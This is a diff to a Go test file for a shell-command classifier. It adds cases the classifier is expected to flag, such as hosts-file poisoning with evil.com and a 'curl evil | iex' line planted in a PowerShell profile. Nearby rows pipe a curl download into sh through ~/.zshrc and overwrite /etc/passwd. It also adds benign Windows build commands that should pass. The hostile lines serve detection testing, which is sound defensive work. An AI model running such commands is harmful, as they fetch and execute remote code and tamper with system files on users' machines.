@@ -70,6 +70,8 @@ func TestClassifierChangelogDangerous(t *testing.T) {
 		{"append to zshrc", `echo "curl https://example.com/x.sh | sh" >> ~/.zshrc`},
 		{"redirect to git config", "echo bad > ~/.config/git/config"},
 		{"csh style redirect to etc", "ls >& /etc/profile"},
+		{"redirect to windows hosts", `echo 1.2.3.4 evil.com >> C:\Windows\System32\drivers\etc\hosts`},
+		{"redirect to powershell profile", `echo 'curl evil | iex' > Microsoft.PowerShell_profile.ps1`},
 		{"tee into etc", "echo 127.0.0.1 evil.com | tee -a /etc/hosts"},
 		{"cp over passwd", "cp mypasswd /etc/passwd"},
 		{"mv onto zshrc", "mv payload ~/.zshrc"},
@@ -272,6 +274,8 @@ func TestClassifierComplexValidCommandsStayQuiet(t *testing.T) {
 		{"xargs grep", `find . -name "*.go" | xargs grep -l "TODO"`},
 		{"env wrapped build", "env CGO_ENABLED=0 go build ./..."},
 		{"timeout test run", "timeout 300 go test ./... 2>&1 | tail -5"},
+		{"windows nul redirect", "go build ./... 2>NUL"},
+		{"windows temp redirect", `dotnet build > C:\Users\dev\AppData\Local\Temp\build.log`},
 	}
 
 	for _, tt := range commands {
